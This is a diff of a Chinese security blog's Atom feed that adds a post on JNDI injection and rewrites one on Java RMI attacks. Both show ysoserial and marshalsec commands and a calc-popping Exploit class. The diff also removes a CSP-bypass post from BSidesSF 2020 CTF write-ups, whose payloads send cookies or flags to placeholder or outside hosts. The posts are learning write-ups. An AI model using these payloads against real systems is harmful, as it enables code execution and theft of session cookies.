@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://prontosil.com/"/>
-  <updated>2020-03-19T15:11:52.177Z</updated>
+  <updated>2020-03-22T10:51:34.239Z</updated>
   <id>http://prontosil.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>jndi入门</title>
+    <link href="http://prontosil.com/posts/fe658142/"/>
+    <id>http://prontosil.com/posts/fe658142/</id>
+    <published>2020-03-22T08:52:41.000Z</published>
+    <updated>2020-03-22T10:51:34.239Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>JNDI(Java Naming and Directory Interface),名为 Java命名和目录接口，JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。放两张直观的图</p><p><img src="/posts/fe658142/1.png" alt></p><p>从图中可以看出，JNDI相当于是更进一步的封装</p><p>JNDI自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置，也就是各种bind。比如在RMI服务器端上可以不直接使用Registry进行bind，而使用JNDI统一管理，当然JNDI底层应该还是调用的Registry的bind，但好处JNDI提供的是统一的配置接口；在客户端也可以直接通过类似URL的形式来访问目标服务，</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre><code class="java">/** * @description: * @author: Pxy * @create: 2020-03-22 16:34 **/import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.NamingException;import javax.naming.spi.NamingManager;public class test {    public static void initPerson() throws Exception{        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常        LocateRegistry.createRegistry(3001);        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);        System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:3001&quot;);        ////初始化        InitialContext ctx = new InitialContext();        //实例化person对象        Person p = new Person();        p.setName(&quot;pxy&quot;);        p.setPassword(&quot;12345&quot;);        //person对象绑定到JNDI服务中，JNDI的名字叫做：person，即我们可以通过person键值，来对Person对象进行索引        ctx.bind(&quot;person&quot;, p);        ctx.close();    }    public static void findPerson() throws Exception{        //因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了        InitialContext ctx = new InitialContext();        //通过lookup查找person对象        Person person = (Person) ctx.lookup(&quot;person&quot;);        System.out.println(person.toString());//        ctx.lookup(&quot;rmi://127.0.0.1:1099/Exploit&quot;);        ctx.close();    }    public static void main(String[] args) throws Exception {        initPerson();        findPerson();    }}</code></pre><p>首先生成一个工厂，然后将对象绑定上，再去访问</p><p><img src="/posts/fe658142/1584867587547.png" alt></p><h2 id="JNDI协议动态转换"><a href="#JNDI协议动态转换" class="headerlink" title="JNDI协议动态转换"></a>JNDI协议动态转换</h2><p>上面的Demo里面，在初始化就预先指定了其上下文环境(RMI),但是在调用 lookup() 时，是可以使用带 URI 动态的转换上下文环境，例如上面已经设置了当前上下文会访问 RMI 服务，那么可以直接使用 RMi的 URI 格式去<strong>转换</strong>(该变)上下文环境，使之访问 RMI 服务上的绑定对象：</p><pre><code class="java">Person person = (Person) ctx.lookup(&quot;rmi://localhost:3001/person&quot;);</code></pre><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>那么如果 <code>lookup</code> 的参数可控呢？</p><p>比如将其改为</p><pre><code>ctx.lookup(&quot;rmi://127.0.0.1:1099/Exploit&quot;);</code></pre><p>Exploit.java</p><pre><code class="java">/** * @description: * @author: Pxy * @create: 2020-03-22 16:37 **/public class Exploit {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {&quot;calc.exe&quot;};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}</code></pre><p>编译好之后，放到一个web目录下</p><p><img src="/posts/fe658142/1584867473029.png" alt></p><p>然后开启RMI服务</p><pre><code>java.exe -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8002/#Exploit 1099</code></pre><p><img src="/posts/fe658142/1584867499037.png" alt></p><p>运行即可弹出计算器</p><p><img src="/posts/fe658142/1584867538545.png" alt></p><p><img src="/posts/fe658142/1584867555946.png" alt></p><blockquote><p>在调试的时候遇到了一个问题，java版本不兼容，由于我电脑上存在java7和java8，会报错</p><p><img src="/posts/fe658142/1584867717633.png" alt></p><p><a href="https://stackoverflow.com/questions/22489398/unsupported-major-minor-version-52-0" target="_blank" rel="noopener">https://stackoverflow.com/questions/22489398/unsupported-major-minor-version-52-0</a></p></blockquote><h2 id="spring-JNDI注入"><a href="#spring-JNDI注入" class="headerlink" title="spring JNDI注入"></a>spring JNDI注入</h2><p>利用链：</p><p><code>JtaTransactionManager</code></p><p><img src="/posts/fe658142/1584868292042.png" alt></p><p>跟进 <code>initUserTransactionAndTransactionManager</code></p><p><img src="/posts/fe658142/1584874126510.png" alt></p><p>继续跟进 <code>lookupUserTransaction</code> 方法</p><p><img src="/posts/fe658142/1584874158465.png" alt></p><p>可以看到调用了lookup,而且我们可以看到整个调用链只要我们可控<code>userTransactionName</code>就可以,</p><p><img src="/posts/fe658142/1584874198634.png" alt></p><p>调用链比较简单，最后控制属性即可</p><pre><code class="java">org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager();object.setUserTransactionName(jndiAddress);</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h2&gt;&lt;p&gt;JNDI(Java Naming and Directory Interface),名为 Java命名和目录接口，JNDI是
+      
+    
+    </summary>
+    
+    
+      <category term="代码审计" scheme="http://prontosil.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    
+      <category term="jndi" scheme="http://prontosil.com/tags/jndi/"/>
+    
+  </entry>
   
   <entry>
     <title>CSRF相关总结</title>
@@ -238,27 +264,25 @@ sys.stdin = open(&amp;quot;test.txt&amp;quot;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;
   </entry>
   
   <entry>
-    <title>jndi注入</title>
+    <title>RMI入门</title>
     <link href="http://prontosil.com/posts/aba5931d/"/>
     <id>http://prontosil.com/posts/aba5931d/</id>
     <published>2020-03-12T14:05:48.000Z</published>
-    <updated>2020-03-15T11:42:38.522Z</updated>
+    <updated>2020-03-22T08:13:42.616Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>Hello接口</p><pre><code class="java">import java.rmi.Remote;import java.rmi.RemoteException;public interface Hello extends Remote{    public String hello() throws RemoteException;}</code></pre><p>对应的实现</p><pre><code class="java">import java.io.Serializable;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;/** * @description: Hello实现 * @author: Pxy * @create: 2020-03-12 22:15 **/public class RemoteHello extends UnicastRemoteObject implements Hello{    protected RemoteHello() throws RemoteException {        super();    }    public String  hello() throws RemoteException {        return &quot;hello&quot;;    }}</code></pre><p>创建一个服务端</p><pre><code class="java">import java.rmi.Naming;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.server.UnicastRemoteObject;/** * @description: RMI服务器 * @author: Pxy * @create: 2020-01-20 08:45 **/public class RMIServer {    public void start() throws Exception{        RemoteHello h = new RemoteHello();        LocateRegistry.createRegistry(1099);        Naming.bind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h);    }    public static void main(String[] args) throws Exception {        RMIServer rmiServer = new RMIServer();        rmiServer.start();    }}</code></pre><p>客户端进行访问</p><pre><code class="java">import java.rmi.Naming;/** * @description: RMI客户端 * @author: Pxy * @create: 2020-01-20 08:57 **/public class TrainMain {    public static void main(String[] args) throws Exception {        Hello hello = (Hello) Naming.lookup(&quot;rmi://127.0.0.1/Hello&quot;);        System.out.println(hello.hello());    }}</code></pre><p>这样就能实现RMI</p>]]></content>
+    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>RMI（Remote Method Invocation）为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在<strong>网络上的不同计算机中,</strong>它的底层是由<strong>socket</strong>和<strong>java序列化和反序列化</strong>支撑起来的。</p><p>Java RMI：Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p><p>我们知道远程过程调用（Remote Procedure Call, RPC）可以用于一个进程调用另一个进程（很可能在另一个远程主机上）中的过程，从而提供了过程的分布能力。Java 的 RMI 则在 RPC 的基础上向前又迈进了一步，即提供分布式对象间的通讯。</p><h3 id="如何找到类？"><a href="#如何找到类？" class="headerlink" title="如何找到类？"></a>如何找到类？</h3><p>类似DNS中域名和IP的对应关系，RMI中有一个 <strong>RMIRegistry</strong> 来提供这种对应关系，客户端通过访问 <strong>RMIRegistry</strong> 来获得对应的类进行加载</p><h3 id="数据是如何传递的？"><a href="#数据是如何传递的？" class="headerlink" title="数据是如何传递的？"></a>数据是如何传递的？</h3><p>当客户端通过RMI注册表找到一个远程接口的时候，所得到的其实是远程接口的一个动态代理对象。当客户端调用其中的方法的时候，方法的参数对象会在序列化之后，传输到服务器端。服务器端接收到之后，进行反序列化得到参数对象。并使用这些参数对象，在服务器端调用实际的方法。调用的返回值Java对象经过序列化之后，再发送回客户端。客户端再经过反序列化之后得到Java对象，返回给调用者。这中间的序列化过程对于使用者来说是透明的，由动态代理对象自动完成。</p><p>所以客户端并不是直接和服务端进行通信的，而是由客户端代理和服务端代理进行通信</p><p>如下图：RMI服务器在 <strong>RMIRegistry</strong> 中进行注册，客户端去查找，然后再进行RMI调用</p><p><img src="/posts/aba5931d/1584862271326.png" alt></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>Hello接口</p><pre><code class="java">import java.rmi.Remote;import java.rmi.RemoteException;public interface Hello extends Remote{    public String hello() throws RemoteException;}</code></pre><p>对应的实现</p><pre><code class="java">import java.io.Serializable;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;/** * @description: Hello实现 * @author: Pxy * @create: 2020-03-12 22:15 **/public class RemoteHello extends UnicastRemoteObject implements Hello{    protected RemoteHello() throws RemoteException {        super();    }    public String  hello() throws RemoteException {        return &quot;hello&quot;;    }}</code></pre><p>创建一个服务端</p><pre><code class="java">import java.rmi.Naming;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.server.UnicastRemoteObject;/** * @description: RMI服务器 * @author: Pxy * @create: 2020-01-20 08:45 **/public class RMIServer {    public void start() throws Exception{        RemoteHello h = new RemoteHello();        LocateRegistry.createRegistry(1099);        Naming.bind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h);    }    public static void main(String[] args) throws Exception {        RMIServer rmiServer = new RMIServer();        rmiServer.start();    }}</code></pre><p>客户端进行访问</p><pre><code class="java">import java.rmi.Naming;/** * @description: RMI客户端 * @author: Pxy * @create: 2020-01-20 08:57 **/public class TrainMain {    public static void main(String[] args) throws Exception {        Hello hello = (Hello) Naming.lookup(&quot;rmi://127.0.0.1/Hello&quot;);        System.out.println(hello.hello());    }}</code></pre><p>（最好能放在两个不同的文件夹</p><p>抓包看一些通信的数据</p><p><img src="/posts/aba5931d/1584863994742.png" alt></p><p>看到 return data, aced 就是java序列化后的标志</p><p><img src="/posts/aba5931d/1584864050735.png" alt></p><h2 id="攻击RMI服务端"><a href="#攻击RMI服务端" class="headerlink" title="攻击RMI服务端"></a>攻击RMI服务端</h2><p>这里用的java7</p><h3 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h3><blockquote><p>Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。</p></blockquote><p>通俗点解释，它就是一个协议，一个在TCP/IP之上的线路层协议，一个RMI的过程，是用到JRMP这个协议去组织数据格式然后通过TCP进行传输，从而达到RMI，也就是远程方法调用</p><p>由于JRMP协议在传输过程中的数据是序列化后的，不管是服务端还是客户端，当接收到JRMP协议数据时，都会把序列化的数据进行反序列化的话，这样就可以互相对打</p><h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><p>创建一个 RMI 服务：</p><pre><code class="java">import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;/** * @description: 创建一个RMI服务 * @author: Pxy * @create: 2020-03-22 15:18 **/public class App {    public static void main(String[] args) {        try {            LocateRegistry.createRegistry(1099);        } catch (RemoteException e) {            e.printStackTrace();        }        while(true);    }}</code></pre><p>在这个服务器上(其实都是在本地，只是区分一下)，存在有漏洞的Apache Common Collections库，那么就可以直接用 </p><pre><code>java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections1 calc.exe</code></pre><p><img src="/posts/aba5931d/1584864819094.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://wulidecade.cn/2020/02/15/RMI%E5%85%A5%E9%97%A8/#more" target="_blank" rel="noopener">RMI入门</a></p><p><a href="https://xz.aliyun.com/t/7079#toc-3" target="_blank" rel="noopener">一篇写的很清楚的文章</a></p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;h2 id=&quot;示例&quot;&gt;&lt;a href=&quot;#示例&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h2&gt;&lt;p&gt;Hello接口&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;java&quot;&gt;import java.rmi.Remote;
-import jav
+        &lt;h2 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h2&gt;&lt;p&gt;RMI（Remote Method Invocation）为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一
       
     
     </summary>
     
     
-      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
+      <category term="代码审计" scheme="http://prontosil.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
     
       <category term="jndi" scheme="http://prontosil.com/tags/jndi/"/>
@@ -528,36 +552,6 @@ codesg se
     
     
       <category term="XSS" scheme="http://prontosil.com/tags/XSS/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>绕过CSP</title>
-    <link href="http://prontosil.com/posts/1e1d8fb4/"/>
-    <id>http://prontosil.com/posts/1e1d8fb4/</id>
-    <published>2020-03-10T07:10:40.000Z</published>
-    <updated>2020-03-10T07:16:09.097Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><table><thead><tr><th><code>default-src</code></th><th><code>&#39;self&#39; cdn.example.com</code></th><th>定义资源默认加载策略</th></tr></thead><tbody><tr><td><code>script-src</code></td><td><code>&#39;self&#39; js.example.com</code></td><td>定义 JS 加载策略</td></tr><tr><td><code>style-src</code></td><td><code>&#39;self&#39; css.example.com</code></td><td>定义 CSS 加载策略</td></tr><tr><td><code>img-src</code></td><td><code>&#39;self&#39; img.example.com</code></td><td>定义图片加载策略</td></tr><tr><td><code>connect-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 Ajax、WebSocket 等加载策略</td></tr><tr><td><code>font-src</code></td><td><code>font.example.com</code></td><td>定义 Font 加载策略</td></tr><tr><td><code>object-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 、、 等引用资源加载策略</td></tr><tr><td><code>media-src</code></td><td><code>media.example.com</code></td><td>定义</td></tr><tr><td><code>frame-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 Frame 加载策略</td></tr><tr><td><code>sandbox</code></td><td><code>allow-forms allow-scripts</code></td><td>对页面的操作应用限制，包括阻止弹出窗口，阻止插件和脚本的执行以及强制执行同源策略。可以不设置sanbox的值使得所有限制启用，或者手动启用以下属性 : <code>allow-forms</code> <code>allow-same-origin</code> <code>allow-scripts</code> <code>allow-popups</code>, <code>allow-modals</code>, <code>allow-orientation-lock</code>, <code>allow-pointer-lock</code>, <code>allow-presentation</code>, <code>allow-popups-to-escape-sandbox</code>, and <code>allow-top-navigation</code></td></tr><tr><td><code>report-uri</code></td><td><code>/some-report-uri</code></td><td>指定浏览器报告策略错误的URL，可以在HTTP头中添加<code>-Report-Only</code> 来指示浏览器只报告不阻断</td></tr><tr><td><code>child-src</code></td><td><code>&#39;self&#39;</code></td><td>child-src指令管理了套嵌浏览的部分（类似于iframe、frame标签）</td></tr><tr><td><code>form-action</code></td><td><code>&#39;self&#39;</code></td><td>定义了form表单中action的范围</td></tr><tr><td><code>frame-ancestors</code></td><td><code>&#39;none&#39;</code></td><td>定义<code>&lt;frame&gt;</code> <code>&lt;iframe&gt;</code> <code>&lt;object&gt;</code> <code>&lt;embed&gt;</code> <code>&lt;applet&gt;</code>加载策略. 直接设置<code>‘none’</code> 几乎等于设置了<code>X-Frame-Options: DENY</code></td></tr><tr><td><code>plugin-types</code></td><td><code>application/pdf</code></td><td>设置有效的MIME类型</td></tr></tbody></table><h2 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h2><h3 id="使用CDN绕过"><a href="#使用CDN绕过" class="headerlink" title="使用CDN绕过"></a>使用CDN绕过</h3><p>一般来说，前端会用到许多的前端框架和库，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险</p><p>案例中hackmd中CSP引用了cloudflare.com CDN服务，于是orange师傅采用了低版本的angular js模板注入来绕过CSP</p><pre><code class="html">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;; script-src &#39;unsafe-eval&#39; https://cdnjs.cloudflare.com;&quot;&gt;&lt;!-- foo=&quot;--&gt;&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;&lt;/script&gt;&lt;div ng-app&gt;    {{constructor.constructor('alert(document.cookie)')()}}&lt;/div&gt;</code></pre><p><a href="https://github.com/hackmdio/codimd/pull/1112/commits/067cfe2d1eedc5a58e5548785858e38fbaa0e84b" target="_blank" rel="noopener">修复</a></p><p><a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">orange师傅的文章</a></p><p>利用条件:</p><ol><li>CDN服务商存在某些低版本的js库</li><li>此CDN服务商在CSP白名单中</li></ol><h3 id="location-href"><a href="#location-href" class="headerlink" title="location.href"></a>location.href</h3><p>通过页面跳转功能来实现</p><pre><code>location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</code></pre><h3 id="link标签绕过-比较老了"><a href="#link标签绕过-比较老了" class="headerlink" title="link标签绕过(比较老了)"></a>link标签绕过(比较老了)</h3><pre><code>&lt;!-- firefox --&gt;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//${cookie}.vps_ip&quot;&gt;&lt;!-- chrome --&gt;&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?${cookie}&quot;&gt;</code></pre><p>带外数据的写法</p><pre><code class="js">var link = document.createElement(&quot;link&quot;);link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);link.setAttribute(&quot;href&quot;, &quot;//vps_ip/?&quot; + document.cookie);document.head.appendChild(link);</code></pre><p>使用条件：</p><p>k可以执行任意的js脚本，但是无法带外数据</p><h3 id="iframe绕过"><a href="#iframe绕过" class="headerlink" title="iframe绕过"></a>iframe绕过</h3><blockquote><p>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效</p></blockquote><h3 id="jsonp绕过"><a href="#jsonp绕过" class="headerlink" title="jsonp绕过"></a>jsonp绕过</h3><p><a href="https://github.com/google/csp-evaluator/tree/master/whitelist_bypasses" target="_blank" rel="noopener">收集</a></p><h2 id="CSP绕过实例"><a href="#CSP绕过实例" class="headerlink" title="CSP绕过实例"></a>CSP绕过实例</h2><h3 id="BSidesSF-2020-csp-1"><a href="#BSidesSF-2020-csp-1" class="headerlink" title="BSidesSF 2020 csp-1"></a>BSidesSF 2020 csp-1</h3><p>csp如下，<code>script-src</code> 支持 data</p><pre><code class="j">content-security-policy:     script-src &#39;self&#39; data:;     default-src &#39;self&#39;;     connect-src *;     report-uri /csp_report</code></pre><p>可以使用 <code>fetch</code> (js实在是不熟悉)</p><p>payload-1</p><pre><code>&lt;script src=&quot;data:,fetch(&#39;/csp-one-flag&#39;).then(x=&gt;x.text()).then(x=&gt;location=&#39;http://rwx.kr/?&#39;+escape(x))&quot;&gt;</code></pre><p>或者编码也是可以的</p><pre><code>// NOTE:// &quot;ZmV0Y...&quot; is base64 encoded text of this script.// fetch(&quot;https://csp-1-5aa1f221.challenges.bsidessf.net/csp-one-flag&quot;).then(r=&gt;r.text()).then(t=&gt;fetch(&quot;YOUR_SERVER&quot;+t))&lt;script src=&quot;data:text/javascript;base64,ZmV0Y2goImh0dHBzOi8vY3NwLTEtNWFhMWYyMjEuY2hhbGxlbmdlcy5ic2lkZXNzZi5uZXQvY3NwLW9uZS1mbGFnIikudGhlbihyPT5yLnRleHQoKSkudGhlbih0PT5mZXRjaCgiWU9VUl9TRVJWRVIiK3QpKQ==&quot;&gt;&lt;/script&gt;</code></pre><h3 id="csp-2"><a href="#csp-2" class="headerlink" title="csp-2"></a>csp-2</h3><pre><code>Content-Security-Policy: script-src &#39;self&#39; ajax.googleapis.com &#39;unsafe-eval&#39;; default-src &#39;self&#39; &#39;unsafe-inline&#39;; connect-src *; report-uri /csp_report</code></pre><p>看到了 <code>ajax.googleapis.com</code> 在白名单中，可以使用其提供的angularjs的模板注入来绕过</p><pre><code class="html">&lt;script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js&gt;&lt;/script&gt;&lt;div ng-app ng-csp&gt;{{constructor.constructor('eval(atob("ZmV0Y2goIi9jc3AtdHdvLWZsYWciKS50aGVuKHg9PngudGV4dCgpKS50aGVuKHg9PmxvY2F0aW9uPSIvL3J3eC5rci8/Iitlc2NhcGUoeCkp"))')()}}&lt;/div&gt;</code></pre><p>payload2</p><pre><code class="js">&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js&quot;&gt;&lt;/script&gt; &lt;div class=&quot;ng-app&quot;&gt; {{ constructor.constructor('fetch("https://csp-2-2446d5a3.challenges.bsidessf.net/csp-two-flag").then(r=>r.text()).then(t=>fetch("YOUR_SERVER"+t))')() }} &lt;/div&gt;</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h2&gt;&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;&lt;code&gt;default-src&lt;/code&gt;&lt;/th&gt;
-&lt;th&gt;&lt;code&gt;
-      
-    
-    </summary>
-    
-    
-      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
-    
-    
-      <category term="CSP" scheme="http://prontosil.com/tags/CSP/"/>
     
   </entry>
   
